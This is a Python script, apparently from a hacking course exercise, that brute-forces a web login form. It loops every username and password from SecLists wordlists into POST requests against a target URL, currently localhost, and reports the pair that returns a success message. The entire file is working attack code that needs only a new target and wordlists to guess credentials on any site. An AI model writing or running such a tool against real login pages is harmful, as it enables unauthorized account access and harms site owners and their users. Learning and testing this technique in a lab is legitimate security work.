# This script performs web app login brute forcing against a user-defined host using secLists wordlists for usernames and passwords
# Logic is adapted from the TCM Python 101 for Hackers course: https://academy.tcm-sec.com/p/python-101-for-hackers 

import sys
import requests

# Define parameters of attack
target = "http://127.0.0.1:5000" # Host IP and port
needle = "Welcome back" # Part of the message received from web app upon successful login
usernameList = "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
usernames = [] # List of usernames created from values of the wordlist
passwordList = "/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100.txt"
passwords = [] # List of passwords created from values of the wordlist

# Open both wordlists for usernames and passwords; save their values as lists to iterate over
with open(usernameList, "r") as users:
	for username in users:
		usernames.append(username.strip("\n")) # Remove the newline characters from each line
users.close()

with open(passwordList, "r") as passes:
	for password in passes:
		passwords.append(password.strip("\n").encode()) # Remove the newline characters from each line
passes.close()

# Iterate over the username and password lists, attempting to login with each username:password combination
for user in usernames:
	for password in passwords:
		sys.stdout.write("[X] Now attempting the combination -> {}:{}\r".format(user, password.decode()))
		sys.stdout.flush() # Print all data to the terminal immediately

		# Make the POST request sending the authentication attempt
		req = requests.post(target, data={"username": user, "password": password})

		# Check if the needle is contained in the server response. If so, then brute force was
		# successful - print the username & password then exit the script
		if needle.encode() in req.content:
			sys.stdout.write("\n")
			sys.stdout.write("\t Valid username and password found! {} : {}".format(user, password))
			sys.exit()

		#If none of the passwords attempted result in a successful login, print a failure message
		sys.stdout.flush()
		sys.stdout.write("\n")
	sys.stdout.write("No valid password found for {}".format(user))
	sys.stdout.write("\n")